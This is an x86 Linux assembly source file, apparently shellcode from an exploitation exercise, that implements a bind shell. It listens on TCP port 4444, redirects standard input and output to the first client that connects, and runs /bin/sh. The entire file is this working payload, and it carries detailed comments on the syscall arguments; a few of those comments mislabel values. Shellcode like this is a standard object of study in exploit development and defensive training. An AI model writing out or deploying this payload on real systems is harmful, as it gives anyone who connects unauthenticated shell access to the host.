; bind shell
;
; system syscalls     /usr/include/i386-linux-gnu/asm/unistd_32.h
; socket syscalls     /usr/include/linux/net.h    
; socket domains      /usr/include/netinet/in.h   (Internet Address Family)
; socket types        /usr/include/i386-linux-gnu/bits/socket_type.h
; socket protocols    /usr/include/i386-linux-gnu/bits/socket.h
; socket options      /usr/include/asm-generic/socket.h


global _start

section .text

_start:

    
    ; socket
    ; int socketcall(int call, unsigned long *args);
    ; int socket(int domain, int type, int protocol);
    ;
    ; int socketcall(1, [2,1,6])

socket:
    xor eax, eax
    xor ebx, ebx
    push 6                      ; protocol = IPPROTO_IP = 6 (tcp)
    push 1                      ; type = SOCK_STREAM = 1
    push 2                      ; domain = PF_INET = 2
    mov ecx, esp                ; args = [2,1,6]
    mov bl, 1                   ; call = sys_socket = 1
    mov al, 102                 ; socketcall
    int 0x80

    mov esi, eax                ; esi == socketfd
    


    ; setsockopt 
    ; int socketcall(int call, unsigned long *args);
    ; int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
    ;
    ; int socketcall(14, [socketfd, 1, 2, *1, 1])

setsockopt:
    xor eax, eax
    mov al, 1                   
    push eax                    ; optlen = 1
    mov ecx, esp
    push ecx                    ; *optval = 1
    inc eax
    push eax                    ; optname = SO_REUSEADDR = 2
    dec eax
    push eax                    ; level = SOL_SOCKET = 1
    push esi                    ; sockfd
    mov ecx, esp                ; args = [socketfd, 1, 2, *1, 1]
    mov bl, 14                  ; call = sys_setsockopt = 14
    mov al, 102                 ; socketcall
    int 0x80




    ; bind 
    ; int socketcall(int call, unsigned long *args);
    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;    struct sockaddr_in {
    ;        short            sin_family;   // word
    ;        unsigned short   sin_port;     // word
    ;        struct in_addr   sin_addr;     // dword (ulong)
    ;    };
    ;
    ; int socketcall(2, [socketfd, [2, 4444, 0]], 16)

bind:
    xor eax, eax
    push eax                    ; sin_addr = INADDR_ANY = 0
    push word 0x5c11            ; sin_port = 4444
    push word 2                 ; sin_family = PF_INET = 2
    mov ecx, esp                ; struct sockaddr *addr = [2, 4444, 0]
    push 16                     ; addrlen = 16
    push ecx                    ; struct sockaddr *addr
    push esi                    ; sockfd
    mov ecx, esp                ; args = [socketfd, [2, 4444, 0]]
    mov bl, 2                   ; call = sys_bind = 2
    mov al, 102                 ; socketcall
    int 0x80




    ; listen
    ; int socketcall(int call, unsigned long *args);
    ; int listen(int sockfd, int backlog);
    ;
    ; int socketcall(4, [socketfd, 4098])

listen:
    push word 4098              ; backlog = 4098
    push esi                    ; sockfd
    mov ecx, esp                ; args = [socketfd, 4098]
    mov bl, 4                   ; call = sys_listen = 4
    mov al, 102                 ; socketcall
    int 0x80




    ; accept
    ; int socketcall(int call, unsigned long *args);
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    ;    struct sockaddr_in {
    ;        short            sin_family;   // word
    ;        unsigned short   sin_port;     // word
    ;        struct in_addr   sin_addr;     // dword (ulong)
    ;    };
    ;
    ; int socketcall(5, [socketfd, NULL, NULL])

accept:
    xor eax, eax
    push eax                    ; addrlen = NULL
    push eax                    ; struct sockaddr *addr = NULL
    push esi                    ; socketfd
    mov ecx, esp                ; args = [socketfd, NULL, NULL]
    mov bl, 5                   ; call = sys_accept = 5
    mov al, 102                 ; socketcall
    int 0x80

    mov edi, eax                ; clientfd



    ; remap i/o
    ; int dup2(int oldfd, int newfd);
    ;
    ; int dup2(clientfd, 2);
    ; int dup2(clientfd, 1);
    ; int dup2(clientfd, 0);

    xor ecx, ecx
    mov cl, 2                   ; newfd = stdin, stdout, stderr
    mov ebx, edi                ; oldfd = socketfd
    xor eax, eax
dup2:
    mov al, 63                  ; dup2
    int 0x80
    dec ecx
    jns dup2                    ; while not signed (not below 0)


  

    ; execve
    ; int execve(const char *filename, char *const argv[], char *const envp[]);
    ;
    ; int execve("/bin//sh", &cmd, 0)

execve:
    xor eax, eax
    push eax                    ; 0
    push 0x68732f2f             ; hs//
    push 0x6e69622f             ; nib/
    mov ebx, esp                ; filename

    push eax                    ; 0
    mov edx, esp                ; envp

    push ebx                    ; filename address
    mov ecx, esp                ; argv

    mov al, 11                  ; execve
    int 0x80
